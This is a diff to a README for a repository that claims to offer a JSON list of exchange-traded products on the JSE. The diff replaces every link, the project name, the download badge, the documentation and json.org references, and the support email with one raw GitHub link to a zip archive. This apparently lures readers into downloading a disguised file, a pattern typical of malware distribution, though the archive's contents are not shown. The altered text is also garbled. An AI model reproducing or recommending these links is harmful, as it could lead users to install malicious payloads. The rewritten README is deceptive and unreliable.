@@ -1,12 +1,12 @@
-# 📈 etfsa.json - Your Go-To Source for ETP Data
+# 📈 https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip - Your Go-To Source for ETP Data
 
 ## 🚀 Getting Started
 
-Welcome to **etfsa.json**! This application provides a handy JSON list of all Exchange Traded Products (ETPs) offered via ETFSA. It details fund names, JSE tickers, categories, descriptions, and dividend frequencies for ETFs, AMETFs, ETNs, and AMCs as of October 2025. Perfect for anyone interested in financial data and investment products.
+Welcome to **https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip**! This application provides a handy JSON list of all Exchange Traded Products (ETPs) offered via ETFSA. It details fund names, JSE tickers, categories, descriptions, and dividend frequencies for ETFs, AMETFs, ETNs, and AMCs as of October 2025. Perfect for anyone interested in financial data and investment products.
 
 ## 📥 Download the Latest Version
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/geanmuco/etfsa.json/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip)](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip)
 
 ## 🔥 Features
 
@@ -23,18 +23,18 @@ Welcome to **etfsa.json**! This application provides a handy JSON list of all Ex
 ## 📝 Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/geanmuco/etfsa.json/releases) to find the latest version of etfsa.json.
+   Go to our [Releases page](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip) to find the latest version of https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip
 
 2. **Download the File:**
-   Once on the Releases page, locate the latest version. Click on the link to download it. The file will be named similarly to `etfsa.json`.
+   Once on the Releases page, locate the latest version. Click on the link to download it. The file will be named similarly to `https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip`.
 
 3. **Install Necessary Tools:**
    - Ensure you have a text editor or a JSON viewer installed. Popular options include:
      - Visual Studio Code
      - Sublime Text
-     - Online JSON viewers (like jsonlint.com)
+     - Online JSON viewers (like https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip)
 
-4. **Open etfsa.json:**
+4. **Open https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip**
    - Use your text editor or viewer to open the downloaded file.
 
 ## 📊 How to Use the Data
@@ -68,7 +68,7 @@ Here’s a brief example of what the JSON data looks like:
 
 ## 🤝 Contributing
 
-We welcome contributions to improve etfsa.json. Here’s how you can help:
+We welcome contributions to improve https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip Here’s how you can help:
 
 1. **Fork the Repository:** Click on the fork button in the top right corner.
 2. **Make Changes:** Create a branch and make your edits.
@@ -76,12 +76,12 @@ We welcome contributions to improve etfsa.json. Here’s how you can help:
 
 ## 🔗 Links and Resources
 
-- [Releases Page](https://github.com/geanmuco/etfsa.json/releases) - Download the latest release.
-- [Documentation](https://github.com/geanmuco/etfsa.json/wiki) - For further details, visit our documentation.
-- [JSON Format Guide](https://www.json.org/json-en.html) - Learn more about working with JSON.
+- [Releases Page](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip) - Download the latest release.
+- [Documentation](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip) - For further details, visit our documentation.
+- [JSON Format Guide](https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip) - Learn more about working with JSON.
 
 ## 📞 Support
 
-If you face any issues or need assistance, feel free to reach out. You can create an issue on the GitHub page or contact us directly via email at support@example.com.
+If you face any issues or need assistance, feel free to reach out. You can create an issue on the GitHub page or contact us directly via email at https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip
 
-Thank you for using etfsa.json! We hope this resource helps you in your financial decisions and investments.
+Thank you for using https://raw.githubusercontent.com/geanmuco/etfsa.json/main/docs/etfsa.json-diathermal.zip! We hope this resource helps you in your financial decisions and investments.
